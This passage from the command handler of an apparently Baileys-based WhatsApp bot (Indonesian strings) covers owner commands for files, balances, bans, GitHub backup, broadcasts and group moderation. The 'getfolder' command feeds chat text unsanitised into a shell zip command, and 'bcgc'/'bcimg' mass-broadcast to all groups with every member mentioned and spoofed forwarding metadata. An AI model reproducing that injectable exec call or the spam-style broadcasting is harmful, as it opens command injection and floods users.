return m.reply(`Pengurangan sangat berlebihan!`);
}
minSaldo(target, parseInt(args[1]));
m.reply(`*SUKSES MIN SALDO*\nNomor: ${args[0]}\nSaldo: Rp. ${toRupiah(parseInt(args[1]))}`);
}
break

case 'addlimit': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 62xx 1000`);
let trgt = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net';
addLimit(trgt, parseInt(args[1]));
m.reply(`*SUKSES ADD LIMIT*\nNomor: ${args[0]}\nLimit: Rp. ${toRupiah(args[1])}`);
}
break

case 'minlimit': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`);
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net';
if (cekLimit(target) < parseInt(args[1]) && cekLimit(target) !== 0) {
return m.reply(`Pengurangan sangat berlebihan!`);
}
minLimit(target, parseInt(args[1]));
m.reply(`*SUKSES MIN LIMIT*\nNomor: ${args[0]}\nLimit: Rp. ${toRupiah(parseInt(args[1]))}`);
}
break

case 'sampah':
case 'delsampah':
case 'delsampah2': {
if (!isOwner) return onlyOwn();
const getFiles = (dir) => {
return fs.readdirSync(dir).filter(v =>
v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") ||
v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") ||
v.endsWith("webp") || v.endsWith("webm")
).map(v => `${dir}/${v}`)};
let libFiles = getFiles('./lib');
let rootFiles = getFiles('.').filter(v => !v.startsWith('./'));
let all = [...libFiles, ...rootFiles];
let jumlahSampah = all.length;
var titd = `${monospace("Jumlah Sampah")}\n\n`;
teks += `Total: ${jumlahSampah} sampah\n\n`;
teks += all.map(o => `${o}\n`).join("");
if (jumlahSampah > 0) {
edit3(teks, `Menghapus ${jumlahSampah} file sampah.`, `Sukses menghapus semua sampah.`);
all.forEach(file => {
fs.unlinkSync(file);
});
} else {
edit2(titd, `Tidak ada file sampah untuk dihapus.`);
}}
break

case 'clearsesi':
case 'clearallsesi': {
if (!isOwner) return onlyOwn()
let directoryPath = path.join(`./${sessionName}`) //&& './lib') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return m.reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key")  )
var teks = `Menghapus ${filteredArray.length} file sampah...`
if (filteredArray.length == 0) return m.reply(teks)
/*filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})*/
edit2(teks, 'Berhasil menghapus semua sampah')
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${sessionName}/${file}`)
});
});
}
break

case 'getdb': {
if (!isOwner) return onlyOwn()
Line.sendMessage(from, {document: fs.readFileSync('./data/db/database.json'), caption: 'Database Bot', mimetype: 'application/json', fileName: 'database.json' }, {quoted: m})
}
break

case 'getfolder': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n${prefix+command} ./foldername\n\nInfo lebih: $ ls ./`);

const folderPath = text;
const zipPath = `${folderPath}.zip`;

try {
exec(`zip -r ${zipPath} ${folderPath}`, (error, stdout, stderr) => {
if (error) {
console.error(`Error saat mengompresi folder: ${error.message}`);
return m.reply('Terjadi kesalahan saat mengompresi folder. Pastikan perintah zip tersedia di sistem.');
}
if (stderr) console.error(`Stderr: ${stderr}`);
if (stdout) console.log(`Stdout: ${stdout}`);
Line.sendMessage(m.chat, {
document: fs.readFileSync(zipPath),
caption: folderPath,
mimetype: 'application/zip',
fileName: path.basename(zipPath)
}, { quoted: m });
fs.unlinkSync(zipPath);
});
} catch (err) {
console.error('Terjadi kesalahan:', err);
m.reply('Terjadi kesalahan saat mengompresi atau mengirim folder.');
}
}
break

case 'getfile': {
if (!isOwner) return onlyOwn();
if (!args[0]) return m.reply(`*CONTOH PENGGUNAAN*\n\n${prefix+command} ./case.js\nBisa js/json dll.\n\nInfo lebih: $ ls`);

const filePath = args[0];
const mimeType = getMimeType(filePath);
const fileName = path.basename(filePath);

try {
Line.sendMessage(m.chat, {
document: fs.readFileSync(filePath),
caption: filePath,
mimetype: mimeType,
fileName: fileName
}, { quoted: m });
} catch (err) {
m.reply('Tidak dapat menemukan file yang kamu cari');
}
}
break

case 'getfile2': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./gambar.jpg\n#2: ${prefix+command} ./data/gambar.jpg\n\nInfo lebih: $ ls`);

const filePath = text;
const fileName = path.basename(filePath);
const mimeType = getMimeType(filePath);
const isImage = /\.(jpg|jpeg|png|gif|bmp|svg|webp|tiff)$/i.test(fileName);

try {
if (isImage) {
Line.sendMessage(from, {
image: fs.readFileSync(filePath),
caption: filePath,
}, { quoted: m });
} else {
Line.sendMessage(from, {
document: fs.readFileSync(filePath),
caption: filePath,
mimetype: mimeType,
fileName: fileName
}, { quoted: m });
}
} catch (err) {
m.reply('Tidak dapat menemukan file yang kamu cari');
}
}
break

case 'addfolder': {
if (!isOwner) return onlyOwn();
if (!text.startsWith("./")) {
return m.reply(`Format salah. Contoh penggunaan: ${prefix+command} ./foldername`);
}
let folderPath = path.resolve(text);
try {
if (fs.existsSync(folderPath)) {
return m.reply('Folder sudah ada di lokasi tersebut!');
}
fs.mkdirSync(folderPath, { recursive: true });
m.reply(`Berhasil membuat folder ${folderPath}`);
} catch (error) {
console.error('Error:', error);
m.reply('Terjadi kesalahan saat membuat folder. Silakan coba lagi.');
}}
break

case 'addfile': {
if (!isOwner) return onlyOwn();
if (!text.includes("./")) return m.reply(`Contoh: ${prefix+command} ./path/to/file.txt`); 
let filePath = path.resolve(text);
let dir = path.dirname(filePath);
let fileName = path.basename(filePath);
if (!fs.existsSync(dir)) {
return m.reply('Direktori tidak ditemukan!');
}
let media = await downloadContentFromMessage(m.quoted, "document");
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
if (fs.existsSync(filePath)) {
fs.appendFileSync(filePath, buffer);
m.reply(`Berhasil menambahkan konten ke ${fileName}`);
} else {
fs.writeFileSync(filePath, buffer);
m.reply(`Berhasil membuat file ${fileName} dan menambahkan konten.`);
}}
break

case 'delfolder': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./lib\n#2: ${prefix+command} ./lib/general\n\nInfo lebih: $ ls`)
const folderPath = path.resolve(text)
const basePath = path.resolve('./')
if (!folderPath.startsWith(basePath)) {
return m.reply('Kamu tidak memiliki izin untuk menghapus folder ini')
}
fs.stat(folderPath, (err, stats) => {
if (err) {
return m.reply('Folder yang kamu cari tidak ditemukan')
}
if (!stats.isDirectory()) {
return m.reply('Path yang diberikan bukan sebuah folder')
}
fs.rmdir(folderPath, { recursive: true }, (err) => {
if (err) {
console.error(err)
return m.reply('Tidak dapat menghapus folder yang kamu cari')
}
m.reply(`Folder ${path.basename(folderPath)} berhasil dihapus`)
})
})
}
break

case 'delfile': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./Line.js\n#2: ${prefix+command} ./data/users.json\n\nInfo lebih: $ ls`)
 
const filePath = path.resolve(text)
const basePath = path.resolve('./')
if (!filePath.startsWith(basePath)) {
return m.reply('Kamu tidak memiliki izin untuk menghapus file ini')
}
try {
if (fs.existsSync(filePath)) {
fs.unlinkSync(filePath)
m.reply(`File ${path.basename(filePath)} berhasil dihapus`)
} else {
m.reply('File yang kamu cari tidak ditemukan')
}
} catch (err) {
console.error(err)
m.reply('Tidak dapat menghapus file yang kamu cari')
}}
break

case 'sendfile': {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply('Kutip pesan seseorang!');
if (!args[0]) return m.reply(`*CONTOH PENGGUNAAN*\n\n${prefix+command} kutip ./case.js\nBisa js/json dll.\n\nInfo lebih: $ ls`);

const filePath = args[0];
const mimeType = getMimeType(filePath);
const fileName = path.basename(filePath);
const targetUser = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net');

try {
Line.sendMessage(targetUser, {
document: fs.readFileSync(filePath),
caption: filePath,
mimetype: mimeType,
fileName: fileName
}, { quoted: m });
m.reply(`File ${fileName} berhasil terkirim!`);
} catch (err) {
m.reply('Tidak dapat menemukan file yang kamu cari');
}
}
break

case 'move': {
if (!isOwner) return onlyOwn();
if (!text.includes(",") || !text.includes("./")) return m.reply(`Contoh: ${prefix+command} index.js, ./lib`);
let [sourceFile, destDir] = text.split(",").map(item => item.trim());
let sourcePath = path.resolve(sourceFile);
let fileName = path.basename(sourcePath);
let destDirPath = path.resolve(destDir);
let destinationPath = path.resolve(destDirPath, fileName);
const allowedExtensions = ['.js', '.txt', '.json', '.md', '.jpg', '.png', '.webp'];
if (!allowedExtensions.includes(path.extname(sourcePath))) {
return m.reply('Jenis file tidak didukung!');
}
if (!fs.existsSync(sourcePath)) {
return m.reply(`File ${sourceFile} tidak ditemukan!`);
}
if (!fs.existsSync(destDirPath)) {
return m.reply(`Direktori tujuan ${destDirPath} tidak ditemukan!`);
}
try {
fs.accessSync(sourcePath, fs.constants.R_OK);
fs.accessSync(destDirPath, fs.constants.W_OK);
} catch (err) {
return m.reply('Akses file atau direktori ditolak!');
}
let baseFileName = path.basename(fileName, path.extname(fileName));
let fileExtension = path.extname(fileName);
let counter = 1;
while (fs.existsSync(destinationPath)) {
destinationPath = path.resolve(destDirPath, `${baseFileName}_clone${counter}${fileExtension}`);
counter++
}
try {
fs.renameSync(sourcePath, destinationPath);
m.reply(`*FILE TELAH DIPINDAHKAN*\nNama: ${path.basename(destinationPath)}\nDari: ${sourcePath}\nKe: ${destinationPath}`);
} catch (err) {
m.reply(`Gagal memindahkan file: ${err.message}`);
}
}
break

case 'bcgc':
case 'bcgrup': {
  if (!isOwner) return onlyOwn()
  if (!isPc) return onlyPrivat()
  vreact()
  if (!text) m.reply(`Contoh: ${p_c} teks`)
  let getGroups = await Line.groupFetchAllParticipating()
  let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
  let anu = groups.map(v => v.id)
  for (let i of anu) {
    await sleep(1500)
    let metadat72 = await Line.groupMetadata(i)
    let participanh = await metadat72.participants
    let msg = generateWAMessageFromContent(i, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              mentionedJid: participanh.map(a => a.id),
              forwardingScore: 99999999999,
              isForwarded: false,
              forwardedNewsletterMessageInfo: {
                newsletterJid: chjid + '@newsletter',
                newsletterName: `Channel ${wm}`,
                serverMessageId: 145
              },
              businessMessageForwardInfo: {
                businessOwnerJid: Line.decodeJid(Line.user.id)
              },
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: text
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: ``
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              title: "",
              subtitle: "",
              hasMediaAttachment: false
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                text: '-'
              }],
            })
          })
        }
      }
    }, {})
    await Line.relayMessage(i, msg.message, {
      messageId: msg.key.id
    })
  }
  m.reply(`Berhasil mengirim broadcast ke ${anu.length} grup!`)
}
break

case 'bcimg':
case 'bcvid': {
  if (!isOwner) return onlyOwn()
  if (!isPc) return onlyPrivat()
  if (!isMediaa) return m.reply('Harus berupa gambar/vidio!')
  if (!text) return m.reply(`Contoh: ${p_c} teks`)
  vreact()
  let getGroups = await Line.groupFetchAllParticipating()
  let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
  let anu = groups.map((v) => v.id)
  for (let xnxx of anu) {
    let metadat72 = await Line.groupMetadata(xnxx)
    let participanh = await metadat72.participants
    if (/image/.test(mime)) {
      media = await Line.downloadAndSaveMediaMessage(quoted)
      mem = await uptotelegra(media)
      let msg = generateWAMessageFromContent(xnxx, {
        viewOnceMessage: {
          message: {
            "messageContextInfo": {
              "deviceListMetadata": {},
              "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
              contextInfo: {
                mentionedJid: participanh.map(a => a.id),
                forwardingScore: 99999999999,
                isForwarded: false,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: chjid + '@newsletter',
                  newsletterName: `Channel ${wm}`,
                  serverMessageId: 145
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: Line.decodeJid(Line.user.id)
                },
              },
              body: proto.Message.InteractiveMessage.Body.create({
                text: text
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: ``
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                title: "",
                subtitle: "",
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia({
                  image: {
                    url: mem
                  }
                }, {
                  upload: Line.waUploadToServer
                }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [{
                  text: '-'
                }],
              })
            })
          }
        }
      }, {})
      await Line.relayMessage(xnxx, msg.message, {
        messageId: msg.key.id
      })
      await sleep(2000)
    } else {
      if (/video/.test(mime)) {
        media1 = await Line.downloadAndSaveMediaMessage(quoted)
        mem1 = await uptotelegra(media1)
        await Line.sendMessage(xnxx, {
          video: {
            url: mem1
          },
          caption: `${kapital(text)}`,
          contextInfo: {
            mentionedJid: participanh.map(a => a.id)
          }
        }, {
          quoted: m
        })
        await sleep(2000)
      } else {
        await Line.sendMessage(xnxx, {
          text: `${kapital(text)}`,
          contextInfo: {
            mentionedJid: participanh.map(a => a.id)
          }
        }, {
          quoted: floc
        })
        await sleep(2000)
      }
    }
    m.reply(`Berhasil mengirim broadcast ke ${anu.length} grup!`)
  }
}
break

case 'bcsl': {
if (args[0] === '#1') {
if (args.length < 3) return m.reply(`Contoh: ${prefix+command} #1 <teks button> <URL>`)
let teksButton = args.slice(1, -1).join(' ')
let urlButton = args[args.length - 1]
let buff = await getBuffer('https://pomf2.lain.la/f/n1l5ww.jpg')
let butt = [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Visit\",\"url\":\"${urlButton}\",\"merchant_url\":\"https://www.google.com\"}`
}]
Line.sendButtonImage(chjid+'@newsletter', `*— BROADCAST SALURAN*\n`, teksButton, buff, butt, null)
m.reply(`Broadcast berhasil terkirim!`)
} else if (args[0] === '#2') {
if (args.length < 3) return m.reply(`Contoh: ${prefix+command} #2 <teks button> <ID Copy>`)
let teksButton = args.slice(1, -1).join(' ')
let copyID = args[args.length - 1]
let buffer = await getBuffer('https://pomf2.lain.la/f/n1l5ww.jpg')
let button = [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy\",\"id\":\"P\",\"copy_code\":\"${copyID}\"}`
}]
Line.sendButtonImage(chjid+'@newsletter', `*— BROADCAST SALURAN*\n`, teksButton, buffer, button, null)
m.reply(`Broadcast berhasil terkirim!`)
} else {
m.reply(`Contoh: ${prefix+command} #1 <teks button> <URL>\nContoh: ${prefix+command} #2 <teks button> <ID Copy>\n\n#1: Button URL\n#2: Button Copy`)
}}
break

case 'adduserdb': {
if (!isOwner) return onlyOwn()
if (!froms) return m.reply('Tag seseorang!')
if (!db.data.users[froms].daftar) return m.reply('User sudah terdaftar di database!')
const currentTimee = Date.now()
global.db.data.users[froms] = {
daftar: true,
nama: `${pushname}`,
otp: randomNomor(1000, 9999),
email: '-',
serial: '-',
Line: false,
lastUnregTime: currentTimee,
gold: 0,
saldo: 0,
limit: 0,
level: 0,
exp: 0
}
var jeje = `Berhasil add @${froms.split('@')[0]} ke database user.`
await reply(jeje)
} 
break

case 'deluserdb': {
if (!isOwner) return onlyOwn()
if (!froms) return m.reply('Tag seseorang!')
delete db.data.users[froms]
peeee = `Berhasil del @${froms.split('@')[0]} dari database user.`
reply(peeee)
}
break

case 'block':
case 'blok': {
if (!isOwner) return onlyOwn() 
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Line.updateBlockStatus(blok, 'block')
m.reply(`Berhasil block @${blok.split('@')[0]}`)
}
break

case 'unblock':
case 'unblok': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Line.updateBlockStatus(unblok, 'unblock')
m.reply(`Berhasil unblock ${unblok.split('@')[0]}`)
}
break

case 'listblock':
case 'listblok': {
if (!isOwner) return onlyOwn()
let listblok = await Line.fetchBlocklist()
m.reply(`${monospace("LIST  BLOCK")}\n` + `Total: ${listblok == undefined ? '*0* diblokir' : '*' + listblok.length + '* diblokir'}\n\n` + listblok.map(v => '• @' + v.replace(/@.+/, '')).join`\n`)
}
break

case 'publik':
case 'public': {
if (!isOwner) return onlyOwn()
Line.public = true
m.reply('Sukses mengubah ke mode public')
}
break

case 'self':
case 'self': {
if (!isOwner) return onlyOwn()
Line.public = false
m.reply('Sukses mengubah ke mode self')
}
break

case 'restart': {
  if (!isOwner) return onlyOwn()
  if (!text) return m.reply('Masukan dulu password script ini!')
  const keyData = await axios.get(decodedURL, {
    headers: {
     'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
  }).then(res => res.data).catch(() => null)
  if (text !== keyData.key) {
    return m.reply('Password salah!')
  } else {
  edit2("Merestart server...", "Sukses merestart server!\nBuka console untuk masukkan password script.")
  await sleep(5000)
  process.exit()
}}
break

case 'join':
case 'joingc': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Harus berupa link grup WhatsApp!')
Line.sendMessage(m.chat, {text: 'Sukses join ke grup.'}, {quoted: m})
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Line.groupAcceptInvite(result)
}
break

case 'setnamabot': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} Line`)
await Line.updateProfileName(text)
await m.reply(`Sukses mengganti nama bot!`)
}
break

case 'setbiobot': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aktif`)
await Line.updateProfileStatus(text)
await m.reply(`Sukses mengganti bio bot!`)
}
break

case 'setppbot': {
if (!isOwner) return onlyOwn()
if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
let media = await Line.downloadAndSaveMediaMessage(quoted)
await Line.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('Sukses mengganti pp bot!')
}
break

case 'delppbot': {
if (!isOwner) return onlyOwn()
await Line.removeProfilePicture(botNumber)
await m.reply(`Sukses menghapus pp bot!`)
}
break

case 'autotyping': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autotyping = true
await m.reply('Sukses mengaktifkan autotyping.')
} else if (args[0] === 'off') {
global.autotyping = false
await m.reply('Sukses menonaktifkan autotyping.')
}}
break

case 'autoread': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoread = true
await m.reply('Sukses mengaktifkan autoread.')
} else if (args[0] === 'off') {
global.autoread = false
await m.reply('Sukses menonaktifkan autoread.')
}}
break

case 'autobio': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autobio = true
await m.reply('Sukses mengaktifkan autobio.')
} else if (args[0] === 'off') {
global.autobio = false
await m.reply('Sukses menonaktifkan autobio.')
}}
break

case 'anticall': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.anticall = true
await m.reply('Sukses mengaktifkan anticall.')
} else if (args[0] === 'off') {
global.anticall = false
await m.reply('Sukses menonaktifkan anticall.')
}}
break

case 'antispam': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antispam = true
await m.reply('Sukses mengaktifkan antispam.')
} else if (args[0] === 'off') {
global.antispam = false
await m.reply('Sukses menonaktifkan antispam.')
}}
break

case 'ban': {
if (!isOwner) return onlyOwn()
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (own.includes(users)) return m.reply('Masa ke owner sendiri.')
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/kutip pesan seseorang!`)
db.data.users[users].banned = true
Line.sendTextWithMentions(m.chat, `Sukses banned user.`, m)
} catch (err) {
m.reply(`Tag/kutip pesan seseorang!`)
}}
break

case 'unban': {
if (!isOwner) return onlyOwn()
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/kutip pesan seseorang!`)
db.data.users[users].banned = false
Line.sendTextWithMentions(m.chat, `Sukses unbanned user.`, m)
} catch (err) {
m.reply(`Tag/kutip pesan seseorang!`)
}}
break

case 'listban': {
let bannedUsers = Object.keys(db.data.users).filter(user => db.data.users[user].banned)
if (bannedUsers.length === 0) return m.reply('Tidak ada user yang dibanned')
let txt = `List user yang dibanned\nTotal: ${bannedUsers.length}\n\n`
for (let user of bannedUsers) {
txt += `• @${user.split('@')[0]}\n`
}
Line.sendTextWithMentions(m.chat, txt, m)
}
break

case 'creategc':
case 'creategrup': {
if (!isOwner) return onlyOwn()
if (!args.join(" ")) return m.reply(`Contoh: ${prefix+command} namagrup`)
try {
let cret = await Line.groupCreate(args.join(" "), [])
let response = await Line.groupInviteCode(cret.id)
let teks2 = `*BERHASIL MEMBUAT GRUP*

• Nama: ${cret.subject}
• Owner: @${cret.owner.split("@")[0]}
• Dibuat: ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
• ID: ${cret.id}
• Link: chat.whatsapp.com/${response}`
m.reply(teks2)
} catch {
m.reply('Terjadi kesalahan')
}}
break

case 'addexc':
case 'addexcept': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} ./namaFile.js`)
if (!text.includes('./')) return m.reply(`Contoh: ${prefix+command} ./namaFile.js`)
const namaa = text.trim()
if (!exceptFiles.includes(namaa)) {
exceptFiles.push(namaa)
m.reply(`File ${namaa} berhasil ditambahkan`)
} else {
m.reply(`File ${namaa} udah ada sebelumnya`)
}}
break

case 'delexc':
case 'delexcept': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} ./namaFile.js`)
if (!text.includes('./')) return m.reply(`Contoh: ${prefix+command} ./namaFile.js`)
const namaf = text.trim()
const index = exceptFiles.indexOf(namaf)
if (index > -1) {
exceptFiles.splice(index, 1)
m.reply(`File ${namaf} berhasil dihapus`)
} else {
m.reply(`File ${namaf} tidak ditemukan`)}
}
break

case 'listexc':
case 'listexcept': {
if (!isOwner) return onlyOwn()
if (exceptFiles.length === 0) return m.reply('Tidak ada file yang dikecualikan')
const list = exceptFiles.join('\n')
m.reply(`List file yang dikecualikan:\n\n${list}`)
}
break

case 'read': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} ./namaFile.js atau ./namaFile.json`)
const filePath = text.trim()
if (exceptFiles.includes(filePath)) {
return m.reply('File tersebut diblok/dikecualikan!')
}
try {
const isinya = await fs.promises.readFile(filePath, "utf-8")
m.reply(isinya)
} catch (err) {
console.error(err)
m.reply(`Terjadi kesalahan`)
}}
break

case 'gh':
case 'db': {
if (!isOwner) return onlyOwn()
if (args.length === 0) {
m.reply(`
List command di case ${command}:
1. Buat Repository
 • ${prefix+command} c-repo namaRepo public/private

2. Hapus Repository
 • ${prefix+command} d-repo namaRepo

3. Info Repository
 • ${prefix+command} i-repo namaRepo

4. Backup
 • ${prefix+command} backup namaRepo ./path
`)
return
}
if (args[0] === 'c-repo') {
const [repoName, visibility] = [args[1], args[2] || 'public']
octokit.repos.createForAuthenticatedUser({
name: repoName,
private: visibility === 'private'
}).then(() => {
m.reply(`Repo ${repoName} berhasil dibuat`)
}).catch(err => m.reply('Error creating repo'))
} else if (args[0] === 'd-repo') {
const repoName = args[1]
octokit.repos.delete({
owner: ghh.name,
repo: repoName
}).then(() => {
m.reply(`Repo ${repoName} berhasil dihapus`)
}).catch(err => m.reply('Error deleting repo'))
} else if (args[0] === 'i-repo') {
const repoName = args[1]
octokit.repos.get({
owner: ghh.name,
repo: repoName
}).then(repo => {
const info = `*INFO REPOSITORY*
• Nama Repo: ${repo.data.name}
• Deskripsi: ${repo.data.description || 'Tidak ada desk'}
• Status: ${repo.data.private ? 'Private' : 'Public'}
• Dibuat: ${new Date(repo.data.created_at).toLocaleString()}`
m.reply(info)
}).catch(err => m.reply('Error fetching repo info'))
} else if (args[0] === 'backup') {
try {
const repoName = args[1]
const pathTarget = args[2] || '.'
const isDirectory = fs.lstatSync(pathTarget).isDirectory()
if (isDirectory) {
m.reply('Mengumpulkan semua file di folder untuk di-backup...')
const ls = (execSync(`ls -R ${pathTarget}`)).toString().split("\n").filter(file => file !== "")
ls.forEach(async (file) => {
try {
const content = fs.readFileSync(`${pathTarget}/${file}`, { encoding: 'base64' })
const filePath = file.startsWith('./') ? file.slice(2) : file
await octokit.request('PUT /repos/{owner}/{repo}/contents/{path}', {
owner: ghh.name,
repo: repoName,
path: filePath,
message: `Backup ${file}`,
content: content
})
m.reply(`File ${file} berhasil di-backup ke repo ${repoName}.`)
} catch (err) {
console.error(`Error backing up file: ${file}`, err)
m.reply(`Error backing up file ${file}: ${err.message}`)
}
})} else {
const content = fs.readFileSync(pathTarget, { encoding: 'base64' })
const filePath = pathTarget.startsWith('./') ? pathTarget.slice(2) : pathTarget
await octokit.request('PUT /repos/{owner}/{repo}/contents/{path}', {
owner: ghh.name,
repo: repoName,
path: filePath,
message: `Backup ${filePath}`,
content: content
})
m.reply(`File ${filePath} berhasil di-backup ke repo ${repoName}`)
}} catch (err) {
console.error(err)
m.reply(`Terjadi kesalahan saat backup ke GitHub: ${err.message}`)
}} else {
m.reply('Cmd tidak ditemukan!')
}}
break

// === Group Menu

case 'add': {
if (!m.isGroup) return onlyGrup();
if (!isOwner && !isAdmins) return onlyAdmin();
if (!isBotAdmins) return onlyBotAdmin();
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await Line.groupMetadata(m.chat);
await Line.groupParticipantsUpdate(m.chat, [users], 'add');
m.reply('Sukses add target.');
} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

case 'kick': {
if (!m.isGroup) return onlyGrup();
if (!isOwner && !isAdmins) return onlyAdmin();
if (!isBotAdmins) return onlyBotAdmin();
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await Line.groupMetadata(m.chat);
await Line.groupParticipantsUpdate(m.chat, [users], 'remove');
m.reply('Sukses kick target.');
} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

case 'linkgc': {
if (!m.isGroup) return onlyGrup()
if (!isBotAdmins) return onlyBotAdmin()
let responsee = await Line.groupInviteCode(m.chat)
Line.sendTeks(m.chat, `https://chat.whatsapp.com/${responsee}\n\nLink grup: ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'revoke': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
await Line.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel ulang link grup`)
}).catch(() => m.reply('Terjadi kesalahan'))
}
break

case 'promote': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Line.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'demote': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Line.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'open': 
case 'buka': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
Line.groupSettingUpdate(m.chat, 'not_announcement')
